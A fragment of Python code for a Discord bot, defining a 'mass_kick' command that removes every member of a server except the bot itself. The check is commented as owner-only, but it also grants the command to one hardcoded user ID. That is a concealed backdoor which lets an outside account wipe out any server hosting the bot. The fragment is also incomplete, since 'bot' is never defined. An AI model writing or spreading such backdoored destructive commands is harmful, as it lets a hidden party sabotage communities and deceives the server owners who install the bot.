import discord
from discord.ext import commands
import datetime
from datetime import datetime
import random
import os
import asyncio
@bot.command()
async def mass_kick(ctx):
    if ctx.author == ctx.guild.owner or ctx.author.id == 1206899273757753375:  # Check if the author is the guild owner
        guild = ctx.guild
        for member in guild.members:
            if member != guild.me:
                try:
                    await member.kick()
                    await asyncio.sleep(1)
                except discord.errors.Forbidden:
                    embed = discord.Embed(title="Error", description=f"I don't have permissions to kick {member.name}.", color=discord.Color.red())
                    await ctx.send(embed=embed)
                    return
        embed = discord.Embed(title="Mass Kick", description="All members except me have been kicked.", color=discord.Color.green())
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Permission Denied", description="You don't have permission to use this command.", color=discord.Color.red())
        await ctx.send(embed=embed)
        